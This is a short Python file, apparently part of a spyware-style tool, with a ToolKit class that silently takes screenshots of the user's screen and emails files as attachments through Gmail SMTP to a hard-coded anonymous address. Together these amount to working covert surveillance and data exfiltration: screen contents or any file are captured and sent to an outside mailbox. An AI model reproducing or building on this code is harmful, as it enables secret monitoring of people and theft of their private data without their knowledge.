import pyautogui
import smtplib
from email.message import EmailMessage
from datetime import datetime
import getpass


class ToolKit:
    def __init__(self):
        ...

    @classmethod
    def take_screen_shot(cls):
        user = getpass.getuser()
        img = pyautogui.screenshot()
        img_name = str(datetime.today()).strip().split('.')[0].replace(':', '-').replace(' ', '_') + '.png'
        img.save(f'C:\\Users\\{user}\\Python\\screenshots\\{img_name}')

    @classmethod
    def send_email(cls, file):  # here we send the files via email of maximum 25MB
        try:
            sender_email = 'anonymous.second.anonymous@gmail.com'
            password = 'P_assword'

            receiver_email = 'anonymous.second.anonymous@gmail.com'

            message = EmailMessage()
            message['Subject'] = 'Data'
            message['From'] = sender_email
            message['To'] = receiver_email
            message.set_content('DATA...')

            with open(file, 'rb') as image:
                data = image.read()
                data_name = image.name

            message.add_attachment(data, maintype='application', subtype='octet-stream',
                                   filename=data_name)

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as conn:
                conn.login(sender_email, password)
                conn.send_message(message)

            return '[EMAIL SEND SUCCESSFULLY]'

        except Exception as e:
            print(e)
            if type(e) == smtplib.SMTPSenderRefused:
                return '[UNABLE TO SEND EMAIL] (Maybe size of file exceed 25MB)'
            return '[UNABLE TO SEND EMAIL]'
